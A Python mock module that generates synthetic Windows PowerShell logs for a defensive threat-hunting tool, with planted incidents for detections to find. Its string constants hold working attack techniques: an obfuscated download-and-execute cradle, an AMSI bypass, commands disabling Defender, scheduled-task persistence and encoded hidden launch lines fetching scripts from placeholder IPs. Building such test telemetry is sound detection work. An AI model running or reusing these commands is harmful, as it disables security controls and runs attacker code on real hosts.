"""
mock_responses.py — a fake Elasticsearch for Peel.

Generates deterministic, ECS-shaped Windows PowerShell telemetry for a few users
and answers each named query in query_dict.py with a response shaped like the
real thing. Event types produced:
  4104  script-block logging (the executed code; split into sequence/total pieces
        when long; each executed layer gets its own script_block_id + runspace)
  4103  module logging (command value + invocation_details / bound parameters)
  400   engine start (carries engine.version — used for the v2-downgrade signal)
  1     Sysmon process create (for cmd.exe and powershell.exe launches / -enc)

Planted stories (so each tab has something to show):
  bob.martin     phishing → encoded cradle (layer 1→2→3): download, AMSI off,
                 Defender off, scheduled-task persistence. Peel reassembles it.
  erin.patel     legit admin, plus one *remote* WinRM session (connected_user
                 differs from user) — the lateral-movement / remote signal.
  dave.kim       developer noise, plus a PowerShell v2 downgrade (blind spot).
  frank.lu       a logging gap: a process event shows powershell.exe -enc, but
                 no matching 4104 — logging was off or bypassed.
  carol.diaz     clean.

The malicious snippets below are deliberately generic, well-known public
patterns, included only so the detections and Peel have something to find.
Point FTD/Peel at a real cluster (FTD_MODE=elastic) and this file is unused.
"""
from __future__ import annotations

import base64
import hashlib
import random
import uuid
from collections import Counter, defaultdict
from datetime import datetime, timedelta, timezone

from corpus import ADMIN, DEV, LONG_CLEAN, NOISE
from detections import fingerprint

UTC = timezone.utc
DAYS = 14
SB, MOD, ENG_START, ENG_STOP, PROC = "4104", "4103", "400", "403", "1"
PS_EXE = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
INDEX_NAME = ".ds-logs-windows.powershell_operational-default-2026.10.18-000001"

USERS = {
    "erin.patel": {"host": "WS-IT-003", "profile": "admin", "seed": 101},
    "bob.martin": {"host": "WS-SAL-022", "profile": "office", "seed": 202},
    "dave.kim": {"host": "WS-DEV-031", "profile": "dev", "seed": 303},
    "frank.lu": {"host": "WS-FIN-009", "profile": "office", "seed": 404},
    "carol.diaz": {"host": "WS-HR-007", "profile": "office", "seed": 505},
}

# ───────── planted malicious layers (generic, well-known patterns) ─────────
# Layer 3: the final intent, in plain PowerShell.
CRADLE_L3 = (
    "Set-MpPreference -DisableRealtimeMonitoring $true\n"
    "$a = New-ScheduledTaskAction -Execute 'rundll32.exe' "
    "-Argument 'C:\\Users\\Public\\u.dll,DllRegisterServer'\n"
    "Register-ScheduledTask -TaskName 'OneDrive Updater' -Action $a "
    "-Trigger (New-ScheduledTaskTrigger -AtLogOn) | Out-Null\n"
    "whoami /all; net group \"domain admins\" /domain"
)
# Layer 2: an AMSI-tamper preamble that then runs a Base64 blob (= layer 3).
_L3_B64 = base64.b64encode(CRADLE_L3.encode("utf-16-le")).decode()
CRADLE_L2 = (
    "$k = [char[]](65,109,115,105) -join ''\n"
    "[Ref].Assembly.GetType(('System.Management.Automation.'+$k+'Utils'))"
    ".GetField(($k.ToLower()+'InitFailed'),'NonPublic,Static').SetValue($null,$true)\n"
    f"$p = '{_L3_B64}'\n"
    "I`E`X ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($p)))"
)
# Layer 1: an obfuscated download cradle that fetches + runs the next stage.
CRADLE_L1 = (
    "$u = 'ht'+'tp://203.0.113.45/'+'s2.ps1'\n"
    "$w = New-Object (\"{1}{0}{2}\" -f 'et.WebCl','N','ient')\n"
    "&($ShellId[1]+$ShellId[13]+'x') ($w.('Down'+'load'+'String').Invoke($u))"
)
# What the launcher put on the command line (process event).
CRADLE_CMDLINE = (
    f'"{PS_EXE}" -nop -w hidden -ep bypass -enc '
    + base64.b64encode(CRADLE_L1.encode("utf-16-le")).decode()
)
# The v2-downgrade blind spot (dave.kim): a launch that no 4104 will cover.
V2_CMDLINE = f'"{PS_EXE}" -Version 2 -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.9/a\')"'
# The logging-gap blind spot (frank.lu): -enc launch, no script block emitted.
GAP_PLAIN = "Invoke-WebRequest -Uri http://198.51.100.23/p.ps1 -OutFile $env:TEMP\\p.ps1; . $env:TEMP\\p.ps1"
GAP_CMDLINE = f'"{PS_EXE}" -nop -w hidden -enc ' + base64.b64encode(GAP_PLAIN.encode("utf-16-le")).decode()
# A remote admin command run under a different connected user (erin's box, lateral).
REMOTE_CMDS = [
    "Get-Service -Name W3SVC | Restart-Service",
    "Get-ChildItem C:\\inetpub\\wwwroot -Recurse | Measure-Object",
    "Invoke-Command -ComputerName APP-07 -ScriptBlock { Get-Process w3wp }",
]


def iso(dt):
    return dt.astimezone(UTC).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def ms(dt):
    return int(dt.timestamp() * 1000)


def parse(ts):
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


def _rel_dt(since):
    import re
    m = re.fullmatch(r"now-(\d+)([hd])", since or "")
    now = datetime.now(UTC)
    if not m:
        return now - timedelta(days=7)
    n, u = int(m.group(1)), m.group(2)
    return now - (timedelta(hours=n) if u == "h" else timedelta(days=n))


class _Gen:
    def __init__(self, user, host, seed, now):
        self.user, self.host, self.now = user, host, now
        self.rng = random.Random(seed)
        self.docs = []
        self.connected = None

    def _guid(self):
        return str(uuid.UUID(int=self.rng.getrandbits(128)))

    def _pid(self):
        return self.rng.randrange(1000, 40000, 4)

    def _doc(self, when, code, ps=None, process=None, connected=None):
        if when > self.now:
            return
        d = {
            "@timestamp": iso(when),
            "event": {"code": code, "provider": "Microsoft-Windows-PowerShell" if code in (SB, MOD, ENG_START, ENG_STOP) else "Microsoft-Windows-Sysmon",
                      "category": ["process"] if code == PROC else [], "kind": "event"},
            "winlog": {"channel": PS_CHANNEL if code in (SB, MOD, ENG_START, ENG_STOP) else "Microsoft-Windows-Sysmon/Operational",
                       "event_id": code, "computer_name": f"{self.host}.contoso.local"},
            "host": {"name": self.host, "hostname": self.host,
                     "os": {"family": "windows", "name": "Windows 11 Enterprise"}},
            "user": {"name": self.user, "domain": "CONTOSO"},
        }
        if ps:
            d["powershell"] = ps
        conn = connected or self.connected
        if conn and code in (SB, MOD, ENG_START, ENG_STOP):
            d.setdefault("powershell", {})["connected_user"] = {"name": conn, "domain": "CONTOSO"}
        if process:
            d["process"] = process
        self.docs.append(d)

    # ── emit a 4104 script block, split into pieces when long ──
    def script_block(self, when, text, runspace, pid, piece_chars=1000):
        sbid = self._guid()
        pieces = [text[i:i + piece_chars] for i in range(0, len(text), piece_chars)] or [text]
        total = len(pieces)
        for seq, part in enumerate(pieces, 1):
            ps = {
                "file": {"script_block_id": sbid, "script_block_text": part},
                "sequence": seq, "total": total,
                "runspace_id": runspace, "pipeline_id": str(self.rng.randint(1, 50)),
                "fingerprint": fingerprint(text) if seq == 1 else fingerprint(part),
            }
            self._doc(when + timedelta(milliseconds=seq * 3), SB,
                      ps=ps, process={"pid": pid, "entity_id": self._guid()})
        return sbid

    def module(self, when, name, path, value, runspace, details):
        self._doc(when, MOD, ps={
            "command": {"name": name, "path": path, "value": value,
                        "invocation_details": details},
            "runspace_id": runspace, "pipeline_id": str(self.rng.randint(1, 50)), "sequence": 1,
        })

    def engine(self, when, version, runspace):
        self._doc(when, ENG_START, ps={"engine": {"version": version, "previous_state": "None",
                                                   "new_state": "Available"}, "runspace_id": runspace})

    def process(self, when, name, cmdline, parent="explorer.exe"):
        self._doc(when, PROC, process={
            "name": name, "command_line": cmdline, "pid": self._pid(), "entity_id": self._guid(),
            "parent": {"name": parent, "entity_id": self._guid()},
        })

    def session(self, start, scripts, version="5.1.19041.3031", connected=None, piece_chars=1000):
        """One interactive session: engine start, then a series of script blocks."""
        rs = self._guid()
        self.connected = connected
        self.engine(start, version, rs)
        t = start + timedelta(seconds=2)
        for s in scripts:
            self.script_block(t, s, rs, self._pid(), piece_chars)
            if self.rng.random() < 0.5:
                self._module_for(t, s, rs)
            t += timedelta(seconds=self.rng.uniform(4, 120))
        self.connected = None
        return rs

    def _module_for(self, when, script, rs):
        """Emit a plausible 4103 for the first command in a script."""
        first = script.strip().splitlines()[0][:120]
        name = first.split()[0] if first else "Get-Item"
        details = [{"type": "CommandInvocation", "related_command": name, "name": None, "value": name}]
        for tokname, tokval in (("Path", "."), ("Name", "svc")):
            if "-" + tokname.lower() in first.lower():
                details.append({"type": "ParameterBinding", "related_command": name,
                                "name": tokname, "value": tokval})
        self.module(when + timedelta(milliseconds=50), name,
                    f"C:\\Windows\\System32\\{name}.ps1" if "-" in name else None, first, rs, details)


def _benign_day(g, day):
    prof = USERS[g.user]["profile"]
    pool = {"admin": ADMIN + NOISE, "dev": DEV + NOISE + LONG_CLEAN,
            "office": NOISE + ADMIN[:4]}.get(prof, NOISE)
    n_sessions = {"admin": g.rng.randint(1, 3), "dev": g.rng.randint(2, 4),
                  "office": g.rng.randint(0, 1)}.get(prof, 1)
    for _ in range(n_sessions):
        start = day + timedelta(hours=g.rng.randint(8, 17), minutes=g.rng.randint(0, 59))
        k = g.rng.randint(2, 6)
        scripts = [g.rng.choice(pool) for _ in range(k)]
        g.session(start, scripts)


def _incident_bob(g, day):
    t = day + timedelta(hours=10, minutes=46)
    # the launcher process (what Family Tree would show)
    g.process(t, "powershell.exe", CRADLE_CMDLINE, parent="winword.exe")
    # three executed layers, each its own script block, same runspace, seconds apart
    rs = g._guid()
    g.engine(t, "5.1.19041.3031", rs)
    g.script_block(t + timedelta(seconds=1), CRADLE_L1, rs, g._pid())
    g.script_block(t + timedelta(seconds=9), CRADLE_L2, rs, g._pid())
    g.script_block(t + timedelta(seconds=14), CRADLE_L3, rs, g._pid())
    # a couple of module events for the tail recon
    g.module(t + timedelta(seconds=15), "whoami", None, "whoami /all", rs,
             [{"type": "CommandInvocation", "related_command": "whoami", "value": "whoami"}])


def _incident_erin_remote(g, day):
    t = day + timedelta(hours=14, minutes=5)
    g.session(t, REMOTE_CMDS, connected="svc_backup")  # connected_user != erin.patel


def _incident_dave_v2(g, day):
    t = day + timedelta(hours=16, minutes=20)
    g.process(t, "powershell.exe", V2_CMDLINE, parent="cmd.exe")
    g.engine(t + timedelta(seconds=1), "2.0", g._guid())  # downgrade visible only via engine version


def _incident_frank_gap(g, day):
    t = day + timedelta(hours=11, minutes=30)
    g.process(t, "powershell.exe", GAP_CMDLINE, parent="outlook.exe")
    # deliberately NO 4104 emitted → logging gap


INCIDENTS = {"bob.martin": (2, _incident_bob), "erin.patel": (3, _incident_erin_remote),
             "dave.kim": (1, _incident_dave_v2), "frank.lu": (2, _incident_frank_gap)}


def generate(now):
    docs = []
    today = now.replace(hour=0, minute=0, second=0, microsecond=0)
    for user, cfg in USERS.items():
        g = _Gen(user, cfg["host"], cfg["seed"], now)
        incident = INCIDENTS.get(user)
        for back in range(DAYS - 1, -1, -1):
            day = today - timedelta(days=back)
            is_incident_day = incident is not None and back == incident[0]
            if day.weekday() >= 5 and not is_incident_day and g.rng.random() < 0.8:
                continue
            _benign_day(g, day)
            if is_incident_day:
                incident[1](g, day)
        docs.extend(g.docs)
    docs.sort(key=lambda d: d["@timestamp"])
    return docs


# ───────────────────────── live feed ─────────────────────────
class _Live:
    def __init__(self, user, host):
        self.g = _Gen(user, host, random.randrange(1 << 30), datetime.now(UTC))
        self.last = datetime.now(UTC)
        self.rs = self.g._guid()
        self.pool = ADMIN + NOISE + DEV

    def produce(self, now):
        g = self.g
        g.now = now
        if (now - self.last).total_seconds() < 0.5:
            return
        for _ in range(g.rng.choice([0, 0, 1, 1, 2])):
            t = self.last + (now - self.last) * g.rng.random()
            g.script_block(t, g.rng.choice(self.pool), self.rs, g._pid())
        if g.rng.random() < 0.07:
            t = now - timedelta(seconds=1)
            g.process(t, "powershell.exe", CRADLE_CMDLINE, parent="excel.exe")
            g.script_block(t + timedelta(milliseconds=500), CRADLE_L1, g._guid(), g._pid())
        self.last = now
        del g.docs[:-400]


class MockElastic:
    def __init__(self):
        self.docs = generate(datetime.now(UTC))
        self._ts = [parse(d["@timestamp"]) for d in self.docs]
        self._live = {}
        self._rng = random.Random(7)

    def respond(self, name, params):
        return getattr(self, f"_q_{name}")(**params)

    def _window(self, since, user=None, codes=None):
        lo = _rel_dt(since)
        out = []
        for t, d in zip(self._ts, self.docs):
            if t < lo:
                continue
            if user and d["user"]["name"] != user:
                continue
            if codes and d["event"]["code"] not in codes:
                continue
            out.append(d)
        return out

    def _resp(self, hits, total, aggs=None):
        r = {"took": self._rng.randint(3, 40), "timed_out": False,
             "_shards": {"total": 3, "successful": 3, "skipped": 0, "failed": 0},
             "hits": {"total": {"value": total, "relation": "eq"}, "max_score": None, "hits": hits}}
        if aggs is not None:
            r["aggregations"] = aggs
        return r

    @staticmethod
    def _hit(d, with_sort=True):
        h = {"_index": INDEX_NAME, "_id": hashlib.sha1(repr(sorted(d.items())).encode()).hexdigest()[:20],
             "_score": None, "_source": d}
        if with_sort:
            h["sort"] = [ms(parse(d["@timestamp"])), 0]
        return h

    def _q_users_overview(self, since="now-7d"):
        docs = self._window(since, codes=[SB, MOD, PROC])
        by = defaultdict(list)
        for d in docs:
            by[d["user"]["name"]].append(d)
        buckets = []
        for u, ds in sorted(by.items(), key=lambda kv: -len(kv[1])):
            hosts = Counter(d["host"]["name"] for d in ds)
            sb = sum(1 for d in ds if d["event"]["code"] == SB)
            last = max(d["@timestamp"] for d in ds)
            buckets.append({"key": u, "doc_count": len(ds),
                            "hosts": {"buckets": [{"key": h, "doc_count": c} for h, c in hosts.most_common(3)]},
                            "scriptblocks": {"doc_count": sb},
                            "last_seen": {"value": ms(parse(last)), "value_as_string": last}})
        return self._resp([], len(docs), {"users": {"buckets": buckets}})

    def _q_user_summary(self, user, since="now-7d"):
        docs = self._window(since, user, [SB, MOD, ENG_START, PROC, "4688"])
        hosts = Counter(d["host"]["name"] for d in docs)
        codes = Counter(d["event"]["code"] for d in docs)
        vers = Counter(d["powershell"]["engine"]["version"] for d in docs
                       if d["event"]["code"] == ENG_START and "engine" in d.get("powershell", {}))
        conn = Counter(d["powershell"]["connected_user"]["name"] for d in docs
                       if "connected_user" in d.get("powershell", {}))
        runspaces = {d["powershell"]["runspace_id"] for d in docs
                     if d.get("powershell", {}).get("runspace_id")}
        hist = Counter(parse(d["@timestamp"]).replace(minute=0, second=0, microsecond=0) for d in docs)
        t = _rel_dt(since).replace(minute=0, second=0, microsecond=0)
        end = datetime.now(UTC)
        per_hour = []
        while t <= end:
            per_hour.append({"key_as_string": iso(t), "key": ms(t), "doc_count": hist.get(t, 0),
                             "codes": {"buckets": []}})
            t += timedelta(hours=1)
        aggs = {
            "hosts": {"buckets": [{"key": h, "doc_count": c} for h, c in hosts.most_common(20)]},
            "runspaces": {"value": len(runspaces)},
            "engine_versions": {"buckets": [{"key": k, "doc_count": c} for k, c in vers.most_common()]},
            "by_code": {"buckets": [{"key": k, "doc_count": c} for k, c in codes.most_common()]},
            "connected_users": {"buckets": [{"key": k, "doc_count": c} for k, c in conn.most_common()]},
            "per_hour": {"buckets": per_hour},
        }
        return self._resp([], len(docs), aggs)

    def _q_user_events(self, user, since="now-7d", page_size=2000, search_after=None):
        docs = self._window(since, user, [SB, MOD, ENG_START, ENG_STOP, PROC, "4688"])
        total = len(docs)
        if search_after:
            cut = int(search_after[0])
            docs = [d for d in docs if ms(parse(d["@timestamp"])) > cut]
        return self._resp([self._hit(d) for d in docs[:page_size]], total)

    def _q_fleet_fingerprints(self, since="now-14d"):
        docs = self._window(since, codes=[SB])
        fps = defaultdict(lambda: {"count": 0, "users": set(), "hosts": set()})
        for d in docs:
            fp = d.get("powershell", {}).get("fingerprint")
            if not fp:
                continue
            e = fps[fp]
            e["count"] += 1
            e["users"].add(d["user"]["name"])
            e["hosts"].add(d["host"]["name"])
        buckets = [{"key": fp, "doc_count": e["count"],
                    "users": {"value": len(e["users"])}, "hosts": {"value": len(e["hosts"])}}
                   for fp, e in sorted(fps.items(), key=lambda kv: -kv[1]["count"])]
        return self._resp([], len(docs), {"fingerprints": {"buckets": buckets}})

    def _q_sample_for_doctor(self, size=500):
        docs = sorted(self.docs, key=lambda d: d["@timestamp"], reverse=True)[:size]
        return self._resp([self._hit(d, with_sort=False) for d in docs], len(docs))

    def _q_live_since(self, user, since_ts, size=200):
        feed = self._live.get(user)
        if feed is None:
            feed = self._live[user] = _Live(user, USERS.get(user, {}).get("host", "WS-X"))
        feed.produce(datetime.now(UTC))
        lo = parse(since_ts)
        docs = sorted((d for d in feed.g.docs if parse(d["@timestamp"]) > lo), key=lambda d: d["@timestamp"])[:size]
        return self._resp([self._hit(d) for d in docs], len(docs))
